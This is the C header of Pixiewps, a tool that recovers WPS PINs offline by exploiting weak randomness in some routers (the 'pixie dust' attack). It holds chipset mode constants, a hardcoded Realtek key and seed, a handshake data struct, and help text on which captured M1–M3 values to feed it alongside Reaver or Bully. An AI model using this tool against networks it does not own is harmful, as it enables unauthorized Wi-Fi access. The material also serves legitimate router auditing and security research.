/*
 * Pixiewps: bruteforce the wps pin exploiting the low or non-existing entropy of some APs (pixie dust attack).
 *           All credits for the research go to Dominique Bongard.
 *
 * Copyright (c) 2015, wiire <wi7ire@gmail.com>
 * SPDX-License-Identifier: GPL-3.0
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
#ifndef PIXIEWPS_H
#define PIXIEWPS_H

/* Modes constants */
#define NONE                  0
#define RT                    1
#define ECOS_SIMPLE           2
#define RTL819x               3
#define ECOS_SIMPLEST         4 /* Not tested */
#define ECOS_KNUTH            5 /* Not tested */

/* Modes constants */
#define MODE_LEN              5
#define MODE3_DAYS            3
#define MODE3_TRIES           3
#define SEC_PER_DAY       86400

/* Exit costants */
#define PIN_FOUND             0
#define PIN_ERROR             1
#define MEM_ERROR             2
#define ARG_ERROR             3

#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include "utils.h"

#if defined(DEBUG)
# define DEBUG_PRINT(fmt, args...); fprintf(stderr, "\n [DEBUG] %s:%d:%s(): " fmt, \
	__FILE__, __LINE__, __func__, ##args); fflush(stdout);
# define DEBUG_PRINT_ARRAY(b, l); byte_array_print(b, l); fflush(stdout);
#else
# define DEBUG_PRINT(fmt, args...)
# define DEBUG_PRINT_ARRAY(b, l)
#endif

uint_fast8_t p_mode[MODE_LEN] = { 0 };
const char *p_mode_name[MODE_LEN + 1] = { "", "RT", "eCos simple", "RTL819x", "eCos simplest", "eCos Knuth" };

const uint8_t wps_rtl_pke[] = {
	0xD0,0x14,0x1B,0x15, 0x65,0x6E,0x96,0xB8, 0x5F,0xCE,0xAD,0x2E, 0x8E,0x76,0x33,0x0D,
	0x2B,0x1A,0xC1,0x57, 0x6B,0xB0,0x26,0xE7, 0xA3,0x28,0xC0,0xE1, 0xBA,0xF8,0xCF,0x91,
	0x66,0x43,0x71,0x17, 0x4C,0x08,0xEE,0x12, 0xEC,0x92,0xB0,0x51, 0x9C,0x54,0x87,0x9F,
	0x21,0x25,0x5B,0xE5, 0xA8,0x77,0x0E,0x1F, 0xA1,0x88,0x04,0x70, 0xEF,0x42,0x3C,0x90,
	0xE3,0x4D,0x78,0x47, 0xA6,0xFC,0xB4,0x92, 0x45,0x63,0xD1,0xAF, 0x1D,0xB0,0xC4,0x81,
	0xEA,0xD9,0x85,0x2C, 0x51,0x9B,0xF1,0xDD, 0x42,0x9C,0x16,0x39, 0x51,0xCF,0x69,0x18,
	0x1B,0x13,0x2A,0xEA, 0x2A,0x36,0x84,0xCA, 0xF3,0x5B,0xC5,0x4A, 0xCA,0x1B,0x20,0xC8,
	0x8B,0xB3,0xB7,0x33, 0x9F,0xF7,0xD5,0x6E, 0x09,0x13,0x9D,0x77, 0xF0,0xAC,0x58,0x07,
	0x90,0x97,0x93,0x82, 0x51,0xDB,0xBE,0x75, 0xE8,0x67,0x15,0xCC, 0x6B,0x7C,0x0C,0xA9,
	0x45,0xFa,0x8D,0xD8, 0xD6,0x61,0xBE,0xB7, 0x3B,0x41,0x40,0x32, 0x79,0x8D,0xAD,0xEE,
	0x32,0xB5,0xDD,0x61, 0xBF,0x10,0x5F,0x18, 0xD8,0x92,0x17,0x76, 0x0B,0x75,0xC5,0xD9,
	0x66,0xA5,0xA4,0x90, 0x47,0x2C,0xEB,0xA9, 0xE3,0xB4,0x22,0x4F, 0x3D,0x89,0xFB,0x2B
};

const uint8_t rtl_rnd_seed[] = {
	0x52,0x65,0x61,0x6c, 0x74,0x65,0x6b,0x20, 0x57,0x69,0x46,0x69, 0x20,0x53,0x69,0x6d,
	0x70,0x6c,0x65,0x2d, 0x43,0x6f,0x6e,0x66, 0x69,0x67,0x20,0x44, 0x61,0x65,0x6d,0x6f,
	0x6e,0x20,0x70,0x72, 0x6f,0x67,0x72,0x61, 0x6d,0x20,0x32,0x30, 0x30,0x36,0x2d,0x30,
	0x35,0x2d,0x31,0x35
};

struct global {
	uint8_t *pke;
	uint8_t *pkr;
	uint8_t *e_hash1;
	uint8_t *e_hash2;
	uint8_t *authkey;
	uint8_t *e_nonce;
	uint8_t *r_nonce;
	uint8_t *psk1;
	uint8_t *psk2;
	uint8_t *dhkey;
	uint8_t *kdk;
	uint8_t *wrapkey;
	uint8_t *emsk;
	uint8_t *e_s1;
	uint8_t *e_s2;
	uint8_t *e_bssid;
	time_t start;
	time_t end;
	uint8_t small_dh_keys;
	uint8_t mode_auto;
	uint8_t bruteforce;
	int verbosity;
	char *error;
	char *warning;
};

char usage[] =
	"\n"
	" Pixiewps %s WPS pixie dust attack tool\n"
	" Copyright (c) 2015, wiire <wi7ire@gmail.com>\n"
	"\n"
	" Usage: %s <arguments>\n"
	"\n"
	" Required Arguments:\n"
	"\n"
	"   -e, --pke         : Enrollee public key\n"
	"   -r, --pkr         : Registrar public key\n"
	"   -s, --e-hash1     : Enrollee hash-1\n"
	"   -z, --e-hash2     : Enrollee hash-2\n"
	"   -a, --authkey     : Authentication session key\n"
	"   -n, --e-nonce     : Enrollee nonce\n"
	"\n"
	" Optional Arguments:\n"
	"\n"
	"   -m, --r-nonce     : Registrar nonce\n"
	"   -b, --e-bssid     : Enrollee BSSID\n"
	"   -S, --dh-small    : Small Diffie-Hellman keys (PKr not needed)  [No]\n"
	"   -v, --verbosity   : Verbosity level 1-3, 1 is quietest           [3]\n"
	"\n"
	"   -h                : Display this usage screen\n"
	"   --help            : Verbose help and more usage examples\n"
	"   -V, --version     : Displays version\n"
	"\n"
	"   --mode N[,... N]  : Mode selection, comma separated           [Auto]\n"
	"   --start [mm/]yyyy : Starting date (only mode 3)       [Current time]\n"
	"   --end   [mm/]yyyy : Ending date   (only mode 3)            [-3 days]\n"
	"\n"
	" Example:\n"
	"\n"
	" pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>\n"
	"%s";

char v_usage[] =
	"\n"
	" Pixiewps %s WPS pixie dust attack tool\n"
	" Copyright (c) 2015, wiire <wi7ire@gmail.com>\n"
	"\n"
	" Description of arguments:\n"
	"\n"
    " -e, --pke\n"
    "\n"
    "    Enrollee DH public key, found in M1.\n"
    "\n"
    " -r, --pkr\n"
    "\n"
    "    Registrar DH public key, found in M2. It can be avoided by specifying "
    "--dh-small in both Reaver and Pixiewps.\n"
    "\n"
    "  [?] pixiewps -e <pke> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce> -S\n"
    "\n"
    " -s, --e-hash1\n"
    "\n"
    "    Enrollee hash-1, found in M3.\n"
    "\n"
    " -z, --e-hash2\n"
    "\n"
    "    Enrollee hash-2, found in M3.\n"
    "\n"
    " -a, --authkey\n"
    "\n"
    "    Authentication session key. Although for this parameter a modified version of "
    "Reaver or Bully is needed, it can be avoided by specifying small Diffie-Hellman "
    "keys in both Reaver and Pixiewps and supplying --e-nonce, --r-nonce and --e-bssid.\n"
    "\n"
    "  [?] pixiewps -e <pke> -s <e-hash1> -z <e-hash2> -S -n <e-nonce> -m <r-nonce> -b <e-bssid>\n"
    "\n"
    " -n, --e-nonce\n"
    "\n"
    "    Enrollee's nonce, found in M1.\n"
    "\n"
    " -m, --r-nonce\n"
    "\n"
    "    Registrar's nonce, found in M2.\n"
    "\n"
    " -b, --e-bssid\n"
    "\n"
    "    Enrollee's BSSID.\n"
    "\n"
    " -S, --dh-small\n"
    "\n"
    "    Small Diffie-Hellman keys. The same option MUST be specified in Reaver "
    "(1.3 or later versions) too. It DOES NOT WORK with mode 3.\n"
    "\n"
	" --mode N[,... N]\n"
	"\n"
	"    Select modes, comma separated (experimental modes are not used if not specified):\n"
	"\n"
	"      1 (%s)\n"
	"      2 (%s)\n"
	"      3 (%s)\n"
	"      4 (%s) [Experimental]\n"
	"      5 (%s)    [Experimental]\n"
	"\n"
	" --start [mm/]yyyy\n"
	" --end   [mm/]yyyy\n"
	"\n"
	"    Starting and ending dates for mode 3. They are interchangeable. "
	"If only one is specified, the machine current time will be used for the other.\n"
	"\n";

/* One digit comma separated number parsing */
inline uint_fast8_t parse_mode(char *list, uint_fast8_t *dst, const uint_fast8_t max_digit) {
	uint_fast8_t cnt = 0;
	while (*list != 0) {
		if (*list <= (max_digit + '0')) {
			dst[cnt] = *list - '0';
			cnt++;
			list++;
		}
		if (*list != 0) {
			if (*list == ',')
				list++;
			else
				return 1;
		}
	}
	return 0;
}

/* Checks if passed mode is selected */
inline uint_fast8_t is_mode_selected(const uint_fast8_t mode) {
	for (uint_fast8_t i = 0; p_mode[i] != NONE && i < MODE_LEN; i++) {
		if (p_mode[i] == mode)
			return 1;
	}
	return 0;
}

#endif /* PIXIEWPS_H */
